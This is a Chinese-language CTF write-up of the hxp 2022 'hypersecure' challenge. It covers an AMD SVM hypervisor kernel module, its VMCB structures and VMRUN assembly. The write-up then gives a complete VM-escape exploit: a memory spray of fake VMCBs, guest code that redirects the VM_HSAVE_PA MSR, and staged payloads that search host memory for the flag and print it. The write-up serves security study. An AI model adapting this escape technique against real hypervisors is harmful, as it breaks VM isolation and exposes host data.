一：前言
====

hypervisor是一个可以创建和运行虚拟机的计算机软件，固件或者是硬件也叫做virtual machine monitor(VMM)。就像ubuntu中有一个virt-manager软件，就是一个图形化的VMM。运行vmm的机器叫做host，由vmm运行的系统叫做guest。

现在常规的hypervisor有两种类型，第一种直接在host的硬件上运行，管理硬件和guest操作系统。第二种运行在电脑的操作系统上，就像一个application。

在x86-system之上，intel公司和AMD公司分别他们在产品上加入了硬件虚拟化Intel-VT和AMD-V，今天我们主要介绍的是AMD的虚拟化产品。

二：hypersecure
=============

1.环境介绍
------

下面从一道CTF题目学习吧

按照惯例先查看run.sh文件，可知环境是由qemu-system启动

```js
#!/bin/sh
qemu-system-x86\_64 \
  -cpu qemu64,+smep,+smap,+svm \
  -kernel ./bzImage \
  -initrd ./initramfs.cpio \
  -m 256 \
  -append "console=ttyS0 kaslr oops=panic ip=dhcp root=/dev/ram rdinit=/init quiet" \
  -nographic \
  -monitor /dev/null \
  -snapshot \
  -smp 1 \
  -no-reboot \

```

看到给了一个hypersecure-hv文件夹，文件夹内的Makefile会将源码编译为hypersecure.ko。那么主要的逻辑就是分析ko文件，由于给了源码，我们直接可以分析源码

先启动docker看看内部环境配置

![2.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-4aa2e30fbbdf8629151555b304facd09be9afe52.png)

之后运行run.sh启动qemu，通过lsmod已经可以看到hypersecure.ko加载到了0xffffffffc04e6000，flag文件放在了root文件夹下，我们所要做的就是从hypervisor中逃出来(逃~~

![3.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-11bc02a3f03fe66b3bc3ddc328b616badc42859d.png)  
如果对内核有一些了解，就会知道内核模块和用户是通过ioctl函数进行交互的，而在ko内也会定义一个ioctl函数，接下来就是正式的逆向过程。

2.逆向分析
------

下面会遇到比较多的陌生名词，我也会尽力介绍清楚

### 1.hypersecure\_user\_ioctl

和平常的ioctl定义不同，没有定义各种case，所以在写exp时ioctl的cmd参数是一个随便的数即可；下面函数功能是将arg传到内核，然后便开始初始化hypersecure和run hypersecure

```js
static long hypersecure_user_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
    int r;

    // One page should be enough for everybody.
    void *page = kzalloc(0x1000, GFP_KERNEL);
    if (!page) {
        return -ENOMEM;
    }
    if (copy_from_user(page, (void *)arg, 0x1000)) {  //arg = first_stage
        hypersecure_log_msg("Failed to read\n");
        kfree(page);
        return -EFAULT;
    }
    r = hypersecure_write_memory(page, 0x1000); //将first_stage写入phys_map+0x3000(IMAGE_START)
    if (r != 0) {
        hypersecure_log_msg("Failed to write memory\n");
        kfree(page);
        return -EFAULT;
    }
    kfree(page);

    r = hypersecure_init_and_run();
    if (r < 0) {
        hypersecure_log_msg("Failed to init and run\n");
        return r;
    }

    return 0;
}

```

### 2.hypersecure\_init\_and\_run

介绍函数作用之前，先看一个重要的结构体"hypersecure\_vcpu"

```js
struct hypersecure_vcpu {
    struct hypersecure_vmcb *vmcb;
    struct hypersecure_vm_state *state;
    unsigned long host_save_va;
    unsigned long host_save_pa;
    unsigned vcpu_id;
};
```

可以看到结构体内还嵌套着两个结构体"hypersecure\_vm\_state","hypersecure\_vmcb"

hypersecure\_vm\_state定义的便是虚拟机的各个寄存器

```php
struct hypersecure_vm_state {
    struct hypersecure_vm_regs regs;
    __u64 clock;
};

struct hypersecure_vm_regs {
    __u64 rbx;
    __u64 rcx;
    __u64 rdx;
    __u64 rdi;
    __u64 rsi;
    __u64 rbp;
    __u64 r8;
    __u64 r9;
    __u64 r10;
    __u64 r11;
    __u64 r12;
    __u64 r13;
    __u64 r14;
    __u64 r15;
    __u64 rip;
    __u64 rax;
    __u64 rsp;
};
```

vmcb全称是Virtual Machine Control Block，hypersecure\_vmcb定义了vmcb的control和save区域，这个定义和qemu中对vmcb的定义是一致的。其中保存了很重要的数据，比如CPU状态和VMM(hypervisor)的信息

```php
struct hypersecure_vmcb {
    struct hypersecure_vmcb_control control;  //vmcb的控制区
    unsigned char pad[0x400 - sizeof(struct hypersecure_vmcb_control)];
    struct hypersecure_vmcb_save_area save;  //vmcb的状态区
} __attribute__ ((aligned (0x1000)));
```

#### 1.vmcb.control

可以看到很多intercept，如果在vm中运行某个指令，比如hlt，vmm便会拦截到该指令然后退出vm

control区域总体规定了guest的规则和vmm的一些状态之类的。

```php
struct hypersecure_vmcb_control {
    struct cr_rd_intercepts_t {
        uint8_t cr_0_rd_intercept : 1;
        uint8_t cr_1_rd_intercept : 1;
        uint8_t cr_2_rd_intercept : 1;
        uint8_t cr_3_rd_intercept : 1;
        uint8_t cr_4_rd_intercept : 1;
        uint8_t cr_5_rd_intercept : 1;
        uint8_t cr_6_rd_intercept : 1;
        uint8_t cr_7_rd_intercept : 1;
        uint8_t cr_8_rd_intercept : 1;
        uint8_t cr_9_rd_intercept : 1;
        uint8_t cr_10_rd_intercept : 1;
        uint8_t cr_11_rd_intercept : 1;
        uint8_t cr_12_rd_intercept : 1;
        uint8_t cr_13_rd_intercept : 1;
        uint8_t cr_14_rd_intercept : 1;
        uint8_t cr_15_rd_intercept : 1; 
    } cr_rd_intercepts ;
    struct cr_wr_intercepts_t {
        uint8_t cr_0_wr_intercept : 1;
        uint8_t cr_1_wr_intercept : 1;
        uint8_t cr_2_wr_intercept : 1;
        uint8_t cr_3_wr_intercept : 1;
        uint8_t cr_4_wr_intercept : 1;
        uint8_t cr_5_wr_intercept : 1;
        uint8_t cr_6_wr_intercept : 1;
        uint8_t cr_7_wr_intercept : 1;
        uint8_t cr_8_wr_intercept : 1;
        uint8_t cr_9_wr_intercept : 1;
        uint8_t cr_10_wr_intercept : 1;
        uint8_t cr_11_wr_intercept : 1;
        uint8_t cr_12_wr_intercept : 1;
        uint8_t cr_13_wr_intercept : 1;
        uint8_t cr_14_wr_intercept : 1;
        uint8_t cr_15_wr_intercept : 1;
    } cr_wr_intercepts ;
    struct dr_rd_intercepts_t {
        uint8_t dr_0_rd_intercept : 1;
        uint8_t dr_1_rd_intercept : 1;
        uint8_t dr_2_rd_intercept : 1;
        uint8_t dr_3_rd_intercept : 1;
        uint8_t dr_4_rd_intercept : 1;
        uint8_t dr_5_rd_intercept : 1;
        uint8_t dr_6_rd_intercept : 1;
        uint8_t dr_7_rd_intercept : 1;
        uint8_t dr_8_rd_intercept : 1;
        uint8_t dr_9_rd_intercept : 1;
        uint8_t dr_10_rd_intercept : 1;
        uint8_t dr_11_rd_intercept : 1;
        uint8_t dr_12_rd_intercept : 1;
        uint8_t dr_13_rd_intercept : 1;
        uint8_t dr_14_rd_intercept : 1;
        uint8_t dr_15_rd_intercept : 1;
    } dr_rd_intercepts ;
    struct dr_wr_intercepts_t {
        uint8_t dr_0_wr_intercept : 1;
        uint8_t dr_1_wr_intercept : 1;
        uint8_t dr_2_wr_intercept : 1;
        uint8_t dr_3_wr_intercept : 1;
        uint8_t dr_4_wr_intercept : 1;
        uint8_t dr_5_wr_intercept : 1;
        uint8_t dr_6_wr_intercept : 1;
        uint8_t dr_7_wr_intercept : 1;
        uint8_t dr_8_wr_intercept : 1;
        uint8_t dr_9_wr_intercept : 1;
        uint8_t dr_10_wr_intercept : 1;
        uint8_t dr_11_wr_intercept : 1;
        uint8_t dr_12_wr_intercept : 1;
        uint8_t dr_13_wr_intercept : 1;
        uint8_t dr_14_wr_intercept : 1;
        uint8_t dr_15_wr_intercept : 1;
    } dr_wr_intercepts ;
    struct excp_vec_intercepts_t {
        uint8_t exception_0_intercept : 1;
        uint8_t exception_1_intercept : 1;
        uint8_t exception_2_intercept : 1;
        uint8_t exception_3_intercept : 1;
        uint8_t exception_4_intercept : 1;
        uint8_t exception_5_intercept : 1;
        uint8_t exception_6_intercept : 1;
        uint8_t exception_7_intercept : 1;
        uint8_t exception_8_intercept : 1;
        uint8_t exception_9_intercept : 1;
        uint8_t exception_10_intercept : 1;
        uint8_t exception_11_intercept : 1;
        uint8_t exception_12_intercept : 1;
        uint8_t exception_13_intercept : 1;
        uint8_t exception_14_intercept : 1;
        uint8_t exception_15_intercept : 1;   
    } excp_vec_intercepts ;  
    struct vec3_t {
        uint8_t pad_full_0[2];
        uint8_t intr_intercept : 1;
        uint8_t nmi_intercept : 1;
        uint8_t smi_intercept : 1;
        uint8_t init_intercept : 1;
        uint8_t vintr_intercept : 1;
        uint8_t cr0_intercept : 1;
        uint8_t idtr_rd_intercept : 1;
        uint8_t gdtr_rd_intercept : 1;
        uint8_t ldtr_rd_intercept : 1;
        uint8_t tr_rd_intercept : 1;
        uint8_t idtr_wr_intercept : 1;
        uint8_t gdtr_wr_intercept : 1;
        uint8_t ldtr_wr_intercept : 1;
        uint8_t tr_wr_intercept : 1;
        uint8_t rdtsc_intercept : 1;
        uint8_t rdpmc_intercept : 1;
        uint8_t pushf_intercept : 1;
        uint8_t popf_intercept : 1;
        uint8_t cpuid_intercept : 1;
        uint8_t rsm_intercept : 1;
        uint8_t iret_intercept : 1;
        uint8_t intn_intercept : 1;
        uint8_t invd_intercept : 1;
        uint8_t pause_intercept : 1;
        uint8_t hlt_intercept : 1;
        uint8_t invlpg_intercept : 1;
        uint8_t invlpga_intercept : 1;
        uint8_t ioio_prot_intercept : 1;
        uint8_t msr_prot_intercept : 1;  //占位1bit，会拦截RDMSR/WRMSR
        uint8_t task_switch_intercept : 1;
        uint8_t ferr_freeze_intercept : 1;
        uint8_t shutdown_events_intercept : 1;
    } vec3 ;
    struct vec4_t {
        uint8_t vmrun_intercept : 1;
        uint8_t vmmcall_intercept : 1;
        uint8_t vmload_intercept : 1;
        uint8_t vmsave_intercept : 1;
        uint8_t stgi_intercept : 1;
        uint8_t clgi_intercept : 1;
        uint8_t skinit_intercept : 1;
        uint8_t rdtscp_intercept : 1;
        uint8_t icebp_intercept : 1;
        uint8_t wbinvd_wbnoinvd_intercept : 1;
        uint8_t monitor_monitorx_intercept : 1;
        uint8_t mwait_mwaitx_intercept : 1;
        uint8_t xsetbvrdpru_intercept : 1;
        uint8_t efer_wr_after_done_intercept : 1;
        uint8_t pad_pre_1 : 2;
        uint8_t cr0_wr_after_done_intercept : 1;
        uint8_t cr1_wr_after_done_intercept : 1;
        uint8_t cr2_wr_after_done_intercept : 1;
        uint8_t cr3_wr_after_done_intercept : 1;
        uint8_t cr4_wr_after_done_intercept : 1;
        uint8_t cr5_wr_after_done_intercept : 1;
        uint8_t cr6_wr_after_done_intercept : 1;
        uint8_t cr7_wr_after_done_intercept : 1;
        uint8_t cr8_wr_after_done_intercept : 1;
        uint8_t cr9_wr_after_done_intercept : 1;
        uint8_t cr10_wr_after_done_intercept : 1;
        uint8_t cr11_wr_after_done_intercept : 1;
        uint8_t cr12_wr_after_done_intercept : 1;
        uint8_t cr13_wr_after_done_intercept : 1;
        uint8_t cr14_wr_after_done_intercept : 1;
        uint8_t cr15_wr_after_done_intercept : 1;
    } vec4 ;
    uint8_t pad_full_2[0x2c]; 
    uint64_t iopm_base_pa; ///////////////////
    uint8_t pad_full_more[60 - 0x34];
    uint64_t tsc_offset;
    uint32_t guest_asid;
    uint8_t tlb_control;
    uint8_t pad_full_3[19];
    uint64_t exitcode;
    uint64_t exitinfo_v1;
    uint64_t exitinfo_v2;
    uint64_t exitintinfo;
    uint8_t np_enable : 1;
    uint8_t pad_pre_4 : 7;
    uint8_t pad_full_5[31];
    uint64_t ncr3;
    uint8_t pad_full_6[8];
    uint32_t vmcb_clean;
    uint8_t pad_full_7[4];
    uint64_t nRIP;
    uint8_t num_bytes_fetched;
    uint64_t bytes_fetched_low : 56;
    uint64_t bytes_fetched_hi; 
    struct vmsa_info_t {
        uint8_t pad_full_8[40];
        uint16_t padding : 12;
        uint64_t vmsa_ptr : 40;
    } vmsa_info ;
} __attribute__ ((packed));
```

#### 2.vmcb.save

运行VMRUN时，处理器先保存host状态，由VM\_HSAVE\_PA MSR指向。保存好host之后，开始读取vmcb的control和save区域，按照save区域恢复vcpu状态，并开始执行rip处的代码，设置vm的intercept等

```php
struct hypersecure_vmcb_save_area {
    struct reg_es_t {
        uint16_t selector;
        uint16_t attribute;
        uint32_t limit;
        uint64_t base;
    } reg_es ;
    struct reg_cs_t {
        uint16_t selector;
        uint16_t attribute;
        uint32_t limit;
        uint64_t base;
    } reg_cs ;
    struct reg_ss_t {
        uint16_t selector;
        uint16_t attribute;
        uint32_t limit;
        uint64_t base;
    } reg_ss ;
    struct reg_ds_t {
        uint16_t selector;
        uint16_t attribute;
        uint32_t limit;
        uint64_t base;
    } reg_ds ;
    struct reg_fs_t {
        uint16_t selector;
        uint16_t attribute;
        uint32_t limit;
        uint64_t base;
    } reg_fs ;
    struct reg_gs_t {
        uint16_t selector;
        uint16_t attribute;
        uint32_t limit;
        uint64_t base;
    } reg_gs ;
    struct reg_gdtr_t {
        uint16_t selector;
        uint16_t attribute;
        uint32_t limit;
        uint64_t base;
    } reg_gdtr ;
    struct reg_ldtr_t {
        uint16_t selector;
        uint16_t attribute;
        uint32_t limit;
        uint64_t base;
    } reg_ldtr ;
    struct reg_idtr_t {
        uint16_t selector;
        uint16_t attribute;
        uint32_t limit;
        uint64_t base;
    } reg_idtr ;
    struct reg_tr_t {
        uint16_t selector;
        uint16_t attribute;
        uint32_t limit;
        uint64_t base;
    } reg_tr ;          
    uint8_t pad_full_0[43];   
    uint8_t cpl;
    uint8_t pad_full_1[4];
    uint64_t efer;
    uint8_t pad_full_2[112]; //203+112+13=328字节
    uint64_t cr4;
    uint64_t cr3;
    uint64_t cr0;
    uint64_t dr7;
    uint64_t dr6;
    uint64_t rflags;
    uint64_t rip;  //56+328=384字节
    uint8_t pad_full_3[88]; 
    uint64_t rsp;
    uint64_t s_cet;
    uint64_t ssp;
    uint64_t isst_addr;
    uint64_t rax;
    uint64_t star;
    uint64_t lstar;
    uint64_t cstar;
    uint64_t sfmask;
    uint64_t kernel_gs_base;
    uint64_t sysenter_cs;
    uint64_t sysenter_esp;
    uint64_t sysenter_eip;
    uint64_t cr2;
    uint8_t pad_full_4[32];
    uint64_t g_pat;
    uint64_t dbgctl;
    uint64_t br_from;
    uint64_t br_to;
    uint64_t lastexcpfrom;
    uint8_t pad_full_5[80];
    uint32_t spec_ctrl;
} __attribute__ ((packed));
```

下面函数主打的就是初始化

```php
int hypersecure_init_and_run(void) {
    unsigned int cpu_index;
    struct hypersecure_vcpu *vcpu; //定义虚拟cpu，也叫vcpu
    int r;

    cpu_index = get_cpu(); 
    vcpu = &global_ctx->vcpus[cpu_index];

    vcpu->state->regs.rip = IMAGE_START; //设置vcpu的rip，就是0x3000
    run_vm(vcpu);  //运行

    put_cpu();

    r = hypersecure_handle_exit(vcpu);
    if (r < 0) {
        return r;
    }

    vcpu->state->regs.rip = vcpu->vmcb->control.nRIP;

    return 0;
}
```

### 3.run\_vm

svm mode是指AMD的虚拟化技术

```php
static void run_vm(struct hypersecure_vcpu *vcpu) {
    const int cpu = raw_smp_processor_id();
    // It may be that SVM is disabled. Let's enable it.
    if (!cpumask_test_cpu(cpu, svm_enabled)) {
        enable_svm(vcpu);
        cpumask_set_cpu(cpu, svm_enabled);
    }
    hypersecure_run(vcpu->vmcb, &vcpu->state->regs);
}

```

### 4.hypersecure\_run

前文介绍过hypersecure\_vmcb是非常重要的一个结构体，保存着guest和host正常运行需要的各种资源；hypersecure\_vm\_regs存着vm的各种寄存器

注：在hypersecure\_init\_and\_run函数中已经初始化了rip

```php
static void hypersecure_run(struct hypersecure_vmcb *vmcb, struct hypersecure_vm_regs *regs) {
    u64 vmcb_phys = virt_to_phys(vmcb);

    // Load the special registers into vmcb from the regs context
    vmcb->save.rip = regs->rip; //加载vm状态 
    vmcb->save.rax = regs->rax;
    vmcb->save.rsp = regs->rsp;

    __hypersecure_run(vmcb_phys, regs);  //运行asm文件 //////////////////

    // Save registers from vmcb to the regs context
    regs->rip = vmcb->save.rip;  //存储vm状态
    regs->rax = vmcb->save.rax;
    regs->rsp = vmcb->save.rsp;
}
```

### 5.\_\_hypersecure\_run

该asm文件是由汇编语言写的，有两个参数vmcb\_phys和regs

我认为非常有必要介绍一个指令"VMRUN"(虽然在vmcb.save写了一点

vmrun需要使用rax来指向vmcb的物理地址加载虚拟机状态；在进入虚拟机之前，在VM\_HSAVE\_PA MSR规定的物理地址保存一些host的状态；然后再从vmcb.save区加载guest的状态；vmrun也会从vmcb.control区读取一些bits向guest注入中断指令(intercept)；之后vmrun将会检查guest的状态是否合法，若不合法，则退出guest。

为了确保执行VMEXIT之后主机能正常运行，vmrun将会保存以下主机状态到一个MSR(VM\_HSAVE\_PA MSR)

```php
1.CS.SEL, NEXT\_RIP—The CS selector and RIP of the instruction following the VMRUN. On #VMEXIT the host resumes running at this address.  
2.RFLAGS, RAX—Host processor mode and the register used by VMRUN to address the VMCB.  
3.SS.SEL, RSP—Host’s stack pointer.  
4.CR0, CR3, CR4, EFER—Host’s paging/operating mode.  
5.IDTR, GDTR—The pseudo-descriptors. (VMRUN does not save or restore the host LDTR.)  
6.ES.SEL and DS.SEL.

```

![4.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-08aaa7269c5830a46ee859bfcc1d25414f09eff6.png)

```php
#include <linux/linkage.h>
#include <asm/asm.h>

/*
    __hypersecure_run(vmcb_phys, regs);

    RDI contains the VMCB
    RSI contains the hypersecure_VM_REGS
*/
SYM_FUNC_START(__hypersecure_run)

// save host registers on the stack    由于是函数调用，所以push的寄存器是host的，即以下的push是存储host状态
push %rbx
push %rcx
push %rdx
push %rdi
push %rsi
push %rbp
push %r8
push %r9
push %r10
push %r11
push %r12
push %r13
push %r14
push %r15

// Save vm regs base
push %rsi

// Save vmcb
push %rdi

//rax作为vm context的基地址
mov %rsi, %rax   

//加载vm寄存器
mov 0x0(%rax), %rbx
mov 0x8(%rax), %rcx
mov 0x10(%rax), %rdx
mov 0x18(%rax), %rdi
mov 0x20(%rax), %rsi
mov 0x28(%rax), %rbp
mov 0x30(%rax), %r8
mov 0x38(%rax), %r9
mov 0x40(%rax), %r10
mov 0x48(%rax), %r11
mov 0x50(%rax), %r12
mov 0x58(%rax), %r13
mov 0x60(%rax), %r14
mov 0x68(%rax), %r15

//vmcb的物理地址pop到rax内
pop %rax

  /////    Starts execution of a guest instruction stream. The physical address of the virtual machine control
  /////     block (VMCB) describing the guest is taken from the rAX register
// run vm
clgi
vmrun  //vmrun的参数是vmcb的物理地址，启动vm
stgi

pop %rax  //pop hypersecure_VM_REGS into rax

mov %rbx, 0x0(%rax)          //存储vm寄存器
mov %rcx, 0x8(%rax)
mov %rdx, 0x10(%rax)
mov %rdi, 0x18(%rax)
mov %rsi, 0x20(%rax)
mov %rbp, 0x28(%rax)
mov %r8,  0x30(%rax)
mov %r9,  0x38(%rax)
mov %r10, 0x40(%rax)
mov %r11, 0x48(%rax)
mov %r12, 0x50(%rax)
mov %r13, 0x58(%rax)
mov %r14, 0x60(%rax)
mov %r15, 0x68(%rax)

// restore host registers
pop %r15
pop %r14
pop %r13
pop %r12
pop %r11
pop %r10
pop %r9
pop %r8
pop %rbp
pop %rsi
pop %rdi
pop %rdx
pop %rcx
pop %rbx

ret 
SYM_FUNC_END(__hypersecure_run)
```

3.bug利用
-------

hypersecure\_setup\_vmcb设置了msr\_prot\_intercept，所以vmm可以拦截rdmsr/wrmsr指令，但是没有设置MSRPM\_BASE\_PA，也就是说MSRPM将会从host的物理地址0开始(在本次的环境之下，host是qemu启动的系统)。从0开始的地址本来是为IO保留的，现在qemu的MSR Permission Map(MSRPM)也会使用这一部分来返回值，这部分内存有很多0数据，MSRPM是MSR的映射表，所以我们可以访问并修改很多的MSR。

VM\_HSAVE\_PA MSR指向的是qemu中定义的vm\_hsave(因为qemu虚拟出cpu)，而vm\_hsave中便是按照vmcb的结构体进行保存host的状态，如果我们能劫持VM\_HSAVE\_PA到我们可以控制的地址，便可以控制host的rip，注意qemu定义的vmcb.save正好和ko文件定义的save结构一样。

![5.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-136585bdebfca81951241991f85eabb50eaa31af.png)

![6.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-4026cc374022d751e74b471908198232cf3a08cb.png)

![7.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-7df4042d87c95ffd2ddd47e1e3d510ebee0a2eeb.png)  
可以修改VM\_HSAVE\_PA MSR指向我们所伪造的host状态，从而劫持了程序。当发起VM-Exit时，处理器从Host保存区读取状态，如果状态被污染，则处理器进入关机状态。

4.exp
-----

### Main.c

```php
#include "first_stage.h"
#include "second_stage.h"
#include <stdio.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stddef.h>

#include "hypersecure-vmcb.h"

#define NEW_HSAVE_PA 0x8000000
#define PAYLOAD_OFF 0x640

static void write_vmcb(void *data) {
    memset(data, 0, 0x1000);
    struct hypersecure_vmcb *vmcb = (struct hypersecure_vmcb *)data;
    _Static_assert(sizeof(*vmcb) <= 0x1000, "aha");
    vmcb->save.rip = NEW_HSAVE_PA + PAYLOAD_OFF;
    //printf("vmcb_addr:0x%lx\n",vmcb);
    printf("vmcb_save:0x%lx\n",&vmcb->save);
    printf(" rip_addr:0x%lx\n",&vmcb->save.rip);
    printf("  content:0x%lx\n",vmcb->save.rip);
    //printf("*********\n");
}

static void write_second_stage(void *data){
    memcpy(data, second_stage_bin, second_stage_bin_len);
}

static int hypercall(int nr, uint64_t arg1, uint64_t arg2, uint64_t arg3)
{
    int ret;
    asm volatile ("movl %1, %%eax\n"
        "movq %2, %%rdi\n"
        "movq %3, %%rsi\n"
        "movq %4, %%rdx\n"
        "vmmcall\n"
        "movl %%eax, %0"
        : "=r"(ret)
        : "r"(nr), "r"(arg1), "r"(arg2), "r"(arg3)
        : "%eax", "%rdi", "%rsi", "%rdx"
    );
    return ret;
}

int main() {
    int hyper_secure_fd;
    int ret;
    // Spray phisycal memory with fake VMCBs.
    size_t sz = 1024 * 1024 * 150;
    void *data = mmap(0, sz, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
    if (data == MAP_FAILED) {
        fprintf(stderr, "failed to map memory\n");
        return -1;
    }
    for (size_t i = 0; i < sz; i += 0x1000) {
        write_vmcb((unsigned char *)data + i);
        write_second_stage((unsigned char *)data + i + PAYLOAD_OFF);
    }
    if ((hyper_secure_fd = open("/dev/hypersecure", O_RDWR)) < 0) {
            fprintf(stderr, "Failed to open hyper-secure connection\n");
            exit(-1);
    }
    // Load blob and run sandbox.
    if ((ret = ioctl(hyper_secure_fd, 0x1337, first_stage_bin)) < 0) {
            fprintf(stderr, "Failed to load and run: %d. Errno: %d\n", ret, errno);
            exit(-1);
    }
    printf("OK!!!!");
    return 0;
}
```

### First\_stage

```php
[BITS 64]
[ORG 0x3000]
mov ecx, 0xc0010117
mov eax, 0x8000000
wrmsr

mov ecx, 0xc0010117
rdmsr

;print to serial
;xor eax, eax
;mov al, edx
;mov edx, 0x3f8
;out dx, ax

; cause exit to cause "CPU" to use to the new HSAVE_PA which we control
hlt
```

### Second\_stage

```php
[BITS 16]

[ORG 0x8000640]

mov edi, 0x8000
mov esi, .third_stage

; Avoid relative jumps because the address past 16 bits is cut off.
%rep 80
mov eax, [esi]
mov [edi], eax
add esi, 4
add edi, 4
%endrep

; jump to final stage
mov edi, 0x8000
jmp edi

.third_stage:
; A reasonable physical start address
mov esi, 0x2000000

.loop:
mov eax, [esi]
cmp eax, 0x7b707868
je .done
add esi, 0x1000
cmp esi, 0x3000000
jl .loop

.done:

mov ecx, 0x40
.print:
xor eax, eax
mov al, [esi]
mov edx, 0x3f8
out dx, ax
inc esi
loop .print

; shutdown
hlt
```

参考链接

<https://hxp.io/blog/104/hxp-CTF-2022-hypersecure-writeup/>

<http://m.blog.chinaunix.net/uid-28541347-id-5854016.html>

<https://back.engineering/04/08/2022/#vmrun-visual-representation>

<https://zhuanlan.zhihu.com/p/69828213>

<https://www.cnblogs.com/echo1937/p/7218201.html>

<http://www.0x04.net/doc/amd/33047.pdf>

[https://elixir.bootlin.com/qemu/v7.2.0/source/target/i386/tcg/sysemu/svm\_helper.c](https://elixir.bootlin.com/qemu/v7.2.0/source/target/i386/tcg/sysemu/svm_helper.c)

<https://elixir.bootlin.com/qemu/v7.2.0/source/target/i386/svm.h#L235>

[https://docs.oracle.com/cd/E53394\_01/pdf/E54851.pdf](https://docs.oracle.com/cd/E53394_01/pdf/E54851.pdf)

<https://www.amd.com/system/files/TechDocs/24594.pdf>

<https://github.com/yifengyou/learn-kvm/blob/master/docs/%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B.md>

<https://github.com/yifengyou/learn-kvm/blob/master/docs/KVM%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/KVM%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%88%9B%E5%BB%BA%E4%B8%8E%E8%BF%90%E8%A1%8C.md>